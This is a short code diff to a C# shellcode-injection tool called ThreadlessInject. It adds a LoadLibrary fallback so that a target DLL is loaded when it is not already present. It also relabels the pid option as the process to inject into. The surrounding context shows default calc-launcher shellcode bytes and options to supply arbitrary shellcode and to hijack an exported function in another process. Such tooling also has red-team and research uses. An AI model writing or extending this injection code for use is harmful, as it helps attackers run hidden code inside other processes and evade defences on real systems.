@@ -67,6 +67,9 @@ namespace ThreadlessInject {
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, out long bytes, int dwSize, out IntPtr lpNumberOfBytesRead);
 
+        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
+
         //x64 calc shellcode function with ret as default if no shellcode supplied
         static byte[] x64 = {  0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
                             0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
@@ -186,7 +189,7 @@ namespace ThreadlessInject {
             OptionSet option_set = new OptionSet()
                 .Add("h|help", "Display this help", v => showHelp = v != null)
                 .Add("x=|shellcode=", "Path/Base64 for x64 shellcode payload (default: calc launcher)", v => shellcodeStr = v)
-                .Add<int>("p=|pid=", @"Attach to an already running process instead", v => pid = v)
+                .Add<int>("p=|pid=", @"Target process ID to inject", v => pid = v)
                 .Add("d=|dll=", "The DLL that that contains the export to patch (must be KnownDll)", v => dll = v)
                 .Add("e=|export=", "The exported function that will be hijacked", v => export = v);
 
@@ -213,7 +216,11 @@ namespace ThreadlessInject {
             IntPtr hDLL = GetModuleHandle(dll);
 
             if(hDLL == IntPtr.Zero) {
-                Console.WriteLine($"[!] Failed to open handle to DLL {dll}, unlikely to be KnownDll");
+                hDLL = LoadLibrary(dll);
+            }
+
+            if(hDLL == IntPtr.Zero) {
+                Console.WriteLine($"[!] Failed to open handle to DLL {dll}, is the KnownDll loaded?");
                 return;
             }
 
